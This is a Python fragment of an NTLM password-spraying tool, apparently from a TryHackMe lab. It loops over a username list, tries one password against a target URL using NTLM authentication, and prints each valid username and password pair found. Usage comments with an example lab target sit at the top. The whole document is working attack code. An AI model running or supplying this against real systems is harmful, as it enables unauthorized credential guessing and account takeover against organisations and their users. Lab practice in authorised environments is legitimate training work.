# This iterates through a list of usernames, attempting to authenticate against a target URL with a single password.
# If successful, it prints out the valid credentials, and at the end, it reports the total number of valid credential pairs found.
# Needs pip install requests-ntlm

# Syntax: python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl> 

# Example: python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com 


def password_spray(self, password, url): 

    print ("[*] Starting passwords spray attack using the following password: " + password) 

    #Reset valid credential counter 

    count = 0 

    #Iterate through all of the possible usernames 

    for user in self.users: 

        #Make a request to the website and attempt Windows Authentication 

        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password)) 

        #Read status code of response to determine if authentication was successful 

        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE): 

            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password) 

            count += 1 

            continue 

        if (self.verbose): 

            if (response.status_code == self.HTTP_AUTH_FAILED_CODE): 

                print ("[-] Failed login with Username: " + user) 

    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found") 
